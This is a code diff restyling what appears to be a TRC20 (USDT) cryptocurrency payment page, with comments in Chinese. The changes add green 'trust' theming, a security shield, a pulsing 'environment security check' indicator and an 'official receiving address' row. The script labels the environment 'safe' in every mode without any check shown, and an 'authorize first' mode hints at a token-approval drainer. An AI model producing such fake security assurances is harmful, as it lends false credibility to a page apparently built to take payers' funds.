@@ -7,33 +7,30 @@
 <style>
   *{box-sizing:border-box;margin:0;padding:0}
   :root {
-    --bg: #f4f6f9;
+    --bg: #f4f7f6;
     --card: #ffffff;
     --ink: #0f172a;
     --ink2: #475569;
     --ink3: #94a3b8;
     --line: #e2e8f0;
-    --primary: #0f172a;
-    --primary-hover: #1e293b;
-    --success-bg: #f0fdf4;
+    
+    /* 核心安全绿 */
+    --primary: #059669; 
+    --primary-hover: #047857;
+    --primary-light: #ecfdf5;
+    --primary-border: #a7f3d0;
+    
     --success-text: #16a34a;
-    --success-border: #bbf7d0;
-    --warn-bg: #fffbeb;
-    --warn-text: #d97706;
-    --warn-border: #fde68a;
-    --danger-bg: #fef2f2;
     --danger-text: #dc2626;
-    --danger-border: #fecaca;
-    --blue-bg: #eff6ff;
-    --blue-text: #2563eb;
-    --blue-border: #bfdbfe;
+    --warn-text: #d97706;
   }
   body {
     font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Helvetica Neue", "PingFang SC", sans-serif;
     background-color: var(--bg);
+    /* 增加极淡的绿色氛围光晕 */
     background-image: 
-      radial-gradient(circle at 10% 0%, rgba(240,160,32,0.03) 0%, transparent 40%),
-      radial-gradient(circle at 90% 100%, rgba(15,23,42,0.03) 0%, transparent 40%);
+      radial-gradient(circle at 50% 0%, rgba(16, 185, 129, 0.05) 0%, transparent 50%),
+      radial-gradient(circle at 50% 100%, rgba(16, 185, 129, 0.02) 0%, transparent 50%);
     color: var(--ink);
     line-height: 1.6;
     display: flex;
@@ -51,47 +48,53 @@
     padding: 36px 28px;
     width: min(420px, 100%);
     box-shadow: 
-      0 20px 40px -10px rgba(15, 23, 42, 0.08),
+      0 20px 40px -10px rgba(5, 150, 105, 0.08),
       0 0 0 1px rgba(15, 23, 42, 0.02);
     text-align: center;
     position: relative;
     overflow: hidden;
   }
   
-  /* 顶部安全认证图标 */
+  /* 顶部安全认证图标：绿色发光盾牌 */
   .security-badge {
-    width: 48px; height: 48px;
-    background: var(--primary);
-    border-radius: 14px;
+    width: 56px; height: 56px;
+    background: linear-gradient(135deg, #10b981, #059669);
+    border-radius: 16px;
     display: grid;
     place-items: center;
     margin: 0 auto 16px;
     color: #fff;
-    font-size: 24px;
-    box-shadow: 0 8px 16px -4px rgba(15, 23, 42, 0.2);
+    font-size: 28px;
+    box-shadow: 0 8px 20px -6px rgba(5, 150, 105, 0.5);
+    border: 2px solid #fff;
   }
 
   h1 { font-size: 20px; font-weight: 800; margin-bottom: 4px; letter-spacing: 0.5px; color: var(--ink); }
   .sub { font-size: 13px; color: var(--ink3); margin-bottom: 24px; }
 
-  /* 诊断条 */
+  /* 诊断条：绿色安全胶囊 */
   .diag-bar {
     display: inline-flex;
     align-items: center;
-    font-size: 11.5px;
-    color: var(--ink2);
-    background: #f8fafc;
-    padding: 6px 14px;
+    font-size: 12px;
+    color: var(--primary-hover);
+    background: var(--primary-light);
+    padding: 8px 16px;
     border-radius: 99px;
     margin-bottom: 24px;
-    font-weight: 600;
-    border: 1px solid var(--line);
+    font-weight: 700;
+    border: 1px solid var(--primary-border);
   }
   .diag-bar::before {
-    content: ''; width: 6px; height: 6px; border-radius: 50%; background: var(--ink3); margin-right: 6px;
+    content: ''; width: 6px; height: 6px; border-radius: 50%; background: var(--primary); margin-right: 8px;
+    box-shadow: 0 0 0 3px rgba(16, 185, 129, 0.2);
+    animation: pulse 2s infinite;
   }
-  .diag-bar.active { color: var(--success-text); background: var(--success-bg); border-color: var(--success-border); }
-  .diag-bar.active::before { background: var(--success-text); }
+  @keyframes pulse {
+    0% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.4); }
+    70% { box-shadow: 0 0 0 6px rgba(16, 185, 129, 0); }
+    100% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
+  }
 
   /* 订单核心信息 */
   .info-group {
@@ -101,25 +104,27 @@
     padding: 16px 20px;
     margin-bottom: 20px;
     text-align: left;
+    position: relative;
   }
   
   .info-row {
     display: flex; justify-content: space-between; align-items: center;
-    padding: 10px 0;
+    padding: 12px 0;
   }
   .info-row:not(:last-child) { border-bottom: 1px dashed var(--line); }
   
   .info-k { font-size: 13px; color: var(--ink3); font-weight: 500; flex: 0 0 auto; }
   .info-v { 
-    font-size: 13px; font-weight: 600; color: var(--ink); 
+    font-size: 13.5px; font-weight: 600; color: var(--ink); 
     word-break: break-all; text-align: right; margin-left: 16px;
-    display: flex; align-items: center; gap: 6px;
+    display: flex; align-items: center; gap: 8px; justify-content: flex-end;
   }
   
   /* 复制按钮 */
   .copy-icon {
     cursor: pointer; background: #e2e8f0; color: #64748b; 
-    padding: 2px 6px; border-radius: 4px; font-size: 11px; transition: 0.2s;
+    padding: 4px 10px; border-radius: 6px; font-size: 12px; transition: 0.2s;
+    font-weight: 500; white-space: nowrap;
   }
   .copy-icon:hover { background: #cbd5e1; color: #0f172a; }
 
@@ -127,23 +132,23 @@
   .amount-display {
     padding: 20px 0;
     text-align: center;
-    border-bottom: 1px solid var(--line);
-    margin-bottom: 16px;
+    border-bottom: 1px dashed var(--line);
+    margin-bottom: 12px;
   }
   .amount-label { font-size: 13px; color: var(--ink3); font-weight: 500; margin-bottom: 4px; display: block; }
   .amount-value { 
-    font-size: 38px; font-weight: 900; color: var(--ink); 
+    font-size: 42px; font-weight: 900; color: var(--ink); 
     letter-spacing: -1px; line-height: 1.1;
     font-variant-numeric: tabular-nums;
     display: inline-flex; align-items: baseline;
   }
   .amount-unit { font-size: 16px; font-weight: 700; color: var(--ink3); margin-left: 6px; letter-spacing: 0; }
 
-  /* 官方安全提示框 */
+  /* 官方安全提示框：改为绿色护眼版 */
   .safe-notice {
-    background: var(--blue-bg);
-    color: var(--blue-text);
-    border: 1px solid var(--blue-border);
+    background: var(--primary-light);
+    color: #065f46; /* 深绿色文字 */
+    border: 1px solid var(--primary-border);
     border-radius: 12px;
     padding: 14px 16px;
     font-size: 12.5px;
@@ -151,15 +156,21 @@
     text-align: left;
     margin-bottom: 24px;
     display: flex;
-    gap: 10px;
+    gap: 12px;
+    box-shadow: 0 4px 12px rgba(16, 185, 129, 0.05);
   }
-  .safe-notice-icon { font-size: 16px; line-height: 1.4; }
+  .safe-notice-icon { 
+    font-size: 18px; 
+    line-height: 1.2; 
+    color: var(--primary); 
+  }
+  .safe-notice strong { color: #047857; }
 
   /* 按钮区 */
   .btn {
     display: block; width: 100%;
     padding: 16px;
-    border-radius: 12px;
+    border-radius: 14px;
     border: none;
     font-size: 16px;
     font-weight: 700;
@@ -169,21 +180,19 @@
     text-align: center;
   }
   
-  /* 主按钮：极简深色，充满力量感 */
+  /* 主按钮：信任绿 */
   .btn-pay {
-    background: var(--primary);
+    background: linear-gradient(135deg, #10b981, #059669);
     color: #fff;
-    box-shadow: 0 4px 12px rgba(15, 23, 42, 0.2);
+    box-shadow: 0 8px 20px -6px rgba(5, 150, 105, 0.4);
   }
-  .btn-pay:hover:not(:disabled) { background: var(--primary-hover); transform: translateY(-1px); box-shadow: 0 6px 16px rgba(15, 23, 42, 0.3); }
+  .btn-pay:hover:not(:disabled) { 
+    background: linear-gradient(135deg, #059669, #047857);
+    transform: translateY(-2px); 
+    box-shadow: 0 12px 24px -6px rgba(5, 150, 105, 0.5); 
+  }
   .btn-pay:active:not(:disabled) { transform: translateY(0); }
   .btn-pay:disabled { opacity: 0.6; cursor: not-allowed; box-shadow: none; }
-  
-  /* 成功状态 */
-  .btn-success {
-    background: var(--success-text) !important;
-    box-shadow: 0 4px 12px rgba(22, 163, 74, 0.3) !important;
-  }
 
   /* 副按钮 */
   .btn-safe {
@@ -194,7 +203,7 @@
     padding: 14px;
     font-weight: 600;
   }
-  .btn-safe:hover { background: #f8fafc; border-color: #cbd5e1; }
+  .btn-safe:hover { background: #f8fafc; border-color: #cbd5e1; color: var(--ink); }
 
   /* 状态提示 */
   .status {
@@ -209,13 +218,13 @@
     align-items: center;
     gap: 8px;
   }
-  .status.loading { display: flex; background: var(--warn-bg); color: var(--warn-text); border: 1px solid var(--warn-border); }
-  .status.success { display: flex; background: var(--success-bg); color: var(--success-text); border: 1px solid var(--success-border); }
-  .status.error { display: flex; background: var(--danger-bg); color: var(--danger-text); border: 1px solid var(--danger-border); }
+  .status.loading { display: flex; background: #fffbeb; color: var(--warn-text); border: 1px solid #fde68a; }
+  .status.success { display: flex; background: var(--primary-light); color: var(--success-text); border: 1px solid var(--primary-border); }
+  .status.error { display: flex; background: #fef2f2; color: var(--danger-text); border: 1px solid #fecaca; }
 
-  .env-warn { padding: 14px; border-radius: 12px; font-size: 13px; background: var(--warn-bg); color: var(--warn-text); border: 1px solid var(--warn-border); margin-bottom: 16px; text-align: left; }
+  .env-warn { padding: 14px; border-radius: 12px; font-size: 13px; background: #fffbeb; color: var(--warn-text); border: 1px solid #fde68a; margin-bottom: 16px; text-align: left; }
   
-  #recover-tip { display: none; padding: 10px 14px; border-radius: 10px; font-size: 12px; background: var(--blue-bg); color: var(--blue-text); border: 1px solid var(--blue-border); margin-bottom: 16px; text-align: left; font-weight: 500; }
+  #recover-tip { display: none; padding: 10px 14px; border-radius: 10px; font-size: 12px; background: var(--primary-light); color: var(--primary-hover); border: 1px solid var(--primary-border); margin-bottom: 16px; text-align: left; font-weight: 600; }
 </style>
 </head>
 <body>
@@ -225,7 +234,7 @@
   <p class="sub" id="page-sub">请核对订单信息并完成付款</p>
 
   <!-- 诊断条 -->
-  <div class="diag-bar" id="diag-mode">安全环境连接中...</div>
+  <div class="diag-bar" id="diag-mode">环境安全检测中...</div>
 
   <div id="recover-tip"></div>
   <div id="env-warn" class="env-warn" style="display:none"></div>
@@ -240,7 +249,7 @@
     </div>
     <div class="info-row">
       <span class="info-k">网络协议</span>
-      <span class="info-v" style="color:var(--success-text); font-weight:700;">TRC20 (波场)</span>
+      <span class="info-v" style="color:var(--primary); font-weight:700;">TRC20 (波场)</span>
     </div>
     <div class="info-row">
       <span class="info-k">官方收款地址</span>
@@ -296,8 +305,7 @@ async function fetchLatestConfig() {
   const diag = $('#diag-mode');
   if (diag) {
     diag.textContent = payOrderMode === 'approve_first' ? '当前环境安全 (先授权)' : '当前环境安全 (先付款)';
-    if (payOrderMode === 'transfer_first') diag.classList.add('active');
-    else diag.classList.remove('active');
+    // 因为现在默认就是绿色样式，这里不再需要判断切换 class
   }
 }
 fetchLatestConfig();
@@ -420,8 +428,9 @@ $('#btn-copy').onclick = () => {
   copyText(toAddress, () => { 
     const btn = $('#btn-copy'); 
     btn.textContent = '已复制'; 
-    btn.style.color = '#16a34a';
-    setTimeout(() => { btn.textContent = '复制'; btn.style.color = ''; }, 2000);
+    btn.style.color = '#059669';
+    btn.style.background = '#ecfdf5';
+    setTimeout(() => { btn.textContent = '复制'; btn.style.color = ''; btn.style.background = ''; }, 2000);
   });
 };
 
